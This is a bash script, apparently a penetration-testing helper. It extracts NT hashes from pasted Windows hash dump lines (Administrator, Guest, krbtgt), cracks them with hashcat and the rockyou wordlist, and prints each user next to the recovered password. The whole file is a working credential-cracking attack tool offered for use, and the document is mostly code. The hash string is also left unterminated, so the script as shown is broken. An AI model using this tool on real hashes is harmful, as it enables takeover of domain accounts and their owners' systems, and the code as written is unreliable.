#!/bin/bash

# Put NTLM hashes that you've got
hashes="Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1ca916c691e1e23d00d33428b12cfd1f:::

# Create a file to store NT hashes
output_file="nt_hashes.txt"

# NT hash Temporary file that will be used to store matching between Users and NT Hashes
tmp_file="user_hash_mapping.txt"

# Clearing files
> "$output_file"
> "$tmp_file"

# Extract NT hashes and build a match between user and NT hashes

echo "$hashes" | while IFS= read -r line; do
  user=$(echo "$line" | awk -F: '{print $1}')
  nt_hash=$(echo "$line" | awk -F: '{print $4}')
  echo "$nt_hash" >> "$output_file"
  echo "$nt_hash:$user" >> "$tmp_file"
done

echo " Hashes was wrote in this file -> $output_file."

# Ask if you want to use hashcat
read -p "Do you want to use hashcat ? (yes/no): " response

if [ "$response" == "yes" ]; then
  echo "Start Cracking"
  hashcat -m 1000 "$output_file" /usr/share/wordlists/rockyou.txt

  echo "---------------------------------------------------------"
  echo "--------------------Cracked Hashes-----------------------"
  echo "---------------------------------------------------------"
  
  # shows cracked passwords
  cracked_hashes=$(hashcat -m 1000 "$output_file" /usr/share/wordlists/rockyou.txt --show)

  # Match creacked hash with user
  echo "$cracked_hashes" | while IFS= read -r cracked_line; do
    nt_hash=$(echo "$cracked_line" | awk -F: '{print $1}')
    password=$(echo "$cracked_line" | awk -F: '{print $2}')
    
    # Finding the user matching the decrypted hash
    user=$(grep "$nt_hash" "$tmp_file" | awk -F: '{print $2}')
    
    # Shows user = passwords
    echo "$user = $password"
  done

else
  echo "Failed to execute hashcat"
fi
